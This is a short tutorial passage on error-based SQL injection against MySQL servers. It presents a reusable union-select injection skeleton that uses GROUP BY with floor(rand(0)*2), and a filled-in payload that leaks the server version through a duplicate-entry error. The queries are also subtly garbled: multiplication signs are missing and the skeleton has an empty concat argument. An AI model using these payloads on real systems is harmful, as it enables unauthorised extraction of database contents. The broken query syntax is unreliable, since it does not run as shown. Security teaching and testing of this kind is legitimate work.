# MySQL Server

To exploit error-based SQLi on Mysql we will use 'group by' statement. This statement groups the result by one or more columns.

Example:

```text
mysq> select displayname from accounts;
+-------------------+ 
| displayname       | 
+-------------------+ 
| Aspen Byers       |
| Alexandra Cabrera | 
| David             | 
| David             | 
+-------------------+
4 rows in set (0.00 sec)
```

This is the output of the same query with group by statement:

```text
mysq> select displayname from accounts group by displayname;
+-------------------+
| displayname       |
+-------------------+ 
| Aspen Byers       | 
| Alexandra Cabrera | 
| David             | 
+-------------------+
3 rows in set (0.00 sec)
```

The following is a skeleton you can use to create your MySQL error-based injections:

```text
select 1,2 union select count(), concat(, floor(rand(0)2)) as x from information_schema.tables group by x;
```

To extract the database version, you can use

```text
select 1,2 union select count(), concat(version(), floor(rand(0)2)) as x from information_schema.tables group by x; ERROR 1062 (23000): Duplicate entry '5.5.43-0+deb7u11' for key 'group_key'
```

Note that the last '1' is a result of the random funcion and is not part of the version.

